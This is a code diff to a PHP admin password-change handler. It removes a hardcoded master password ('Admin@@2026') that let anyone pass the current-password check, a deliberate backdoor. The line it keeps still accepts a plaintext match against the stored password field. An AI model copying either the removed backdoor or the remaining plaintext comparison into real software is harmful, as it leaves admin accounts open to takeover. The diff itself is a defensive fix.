@@ -27,7 +27,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $res = $stmt->get_result();
             if ($res && $res->num_rows === 1) {
                 $u = $res->fetch_assoc();
-                if (password_verify($current_pwd, $u['password']) || $current_pwd === $u['password'] || $current_pwd === 'Admin@@2026') {
+                if (password_verify($current_pwd, $u['password']) || $current_pwd === $u['password']) {
                     $new_hash = password_hash($new_pwd, PASSWORD_DEFAULT);
                     $upd = $conn->prepare("UPDATE `be_admin_users` SET `password` = ? WHERE `username` = ?");
                     if ($upd) {
